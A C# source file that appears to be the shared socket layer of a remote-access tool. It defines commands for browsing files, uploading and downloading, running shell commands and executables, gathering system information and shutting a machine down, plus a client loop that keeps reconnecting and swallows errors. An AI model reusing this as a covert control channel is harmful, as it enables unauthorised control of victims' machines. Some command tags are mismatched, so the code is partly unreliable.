using System.Net.Sockets;
using System.Net;
using System;

namespace Shared
{
    public enum SocketCommands
    {
        NotifyMessage,
        ExplorePath,
        UploadFile,
        DownLoadFile,
        NotifyShellCommand,
        NotifyOSInformations,
        RemoteShutdown,
        PingTarget,
        ExecFile,
    }
    public class ManagementSocketConnection
    {
        private static readonly IDictionary<SocketCommands, string> _listCommands = new Dictionary<SocketCommands, string>()
        {
            {SocketCommands.NotifyMessage, "<NotifyMessage>" },
            {SocketCommands.ExplorePath, "<ExplorePath>" },
            {SocketCommands.UploadFile, "<NotifyMSG>" },
            {SocketCommands.DownLoadFile, "<UploadFile>" },
            {SocketCommands.NotifyShellCommand, "<NotifyShellCommand>" },
            {SocketCommands.NotifyOSInformations, "<NotifyOSInformations>" },
            {SocketCommands.RemoteShutdown, "<RemoteShutdown>" },
            {SocketCommands.PingTarget, "<PingTarget>" },
            {SocketCommands.ExecFile, "<ExecFile>" }
        };

        public static string SocketCommand(SocketCommands SocketCommand) => _listCommands[SocketCommand];

        public ManagementSocketConnection() { }

        public static Task ConnectionPoolingAsync(
            Socket webSocket,
            IPEndPoint endpoint,
            IProgress<Socket> notifyConnection,
            CancellationToken cancellationToken)
        {
            return Task.Run(async () =>
            {
                while (true)
                {
                    cancellationToken.ThrowIfCancellationRequested();

                    try
                    {
                        if (!webSocket.Connected)
                        {
                            await webSocket.ConnectAsync(endpoint, cancellationToken);
                            notifyConnection.Report(webSocket);
                        }
                    }
                    catch { }
                }

            }, cancellationToken);
        }

        public static Task ConnectionListenerAsync(
            Socket webSocket,
            IPEndPoint endpoint,
            IProgress<Socket> notifyConnection,
            CancellationToken cancellationToken)
        {
            return Task.Run(async () =>
            {
                webSocket.Bind(endpoint);
                webSocket.Listen();

                while (true)
                {
                    cancellationToken.ThrowIfCancellationRequested();

                    try
                    {
                        Socket client = await webSocket.AcceptAsync(cancellationToken);
                        notifyConnection.Report(client);
                    }
                    catch
                    {
                        webSocket.Close();
                        throw;
                    }
                }

            }, cancellationToken);
        }

        public static Task<byte[]> SocketReaderAsync(
            Socket webSocket,
            CancellationToken cancellationToken,
            IProgress<long>? notifyProgress = null)
        {
            return Task.Run(async () =>
            {
                long received = 0;

                byte[] buffer = new byte[webSocket.Available];

                while (received < buffer.LongLength)
                {
                    cancellationToken.ThrowIfCancellationRequested();
                    received += await webSocket.ReceiveAsync(buffer, SocketFlags.None, cancellationToken);
                    notifyProgress?.Report(received);
                }

                return buffer;

            }, cancellationToken);
        }

        public static Task SocketWriterAsync(
            Socket webSocket,
            byte[] buffer,
            CancellationToken cancellationToken,
            IProgress<long>? notifyProgress = null)
        {
            return Task.Run(async () =>
            {
                long sent = 0;

                while (sent < buffer.LongLength)
                {
                    cancellationToken.ThrowIfCancellationRequested();
                    sent += await webSocket.SendAsync(buffer, SocketFlags.None, cancellationToken);
                    notifyProgress?.Report(sent);
                }

            }, cancellationToken);
        }

        public static bool StreamAvaliable(Socket socket)
        {
            return socket.Available > uint.MinValue;
        }
    }
}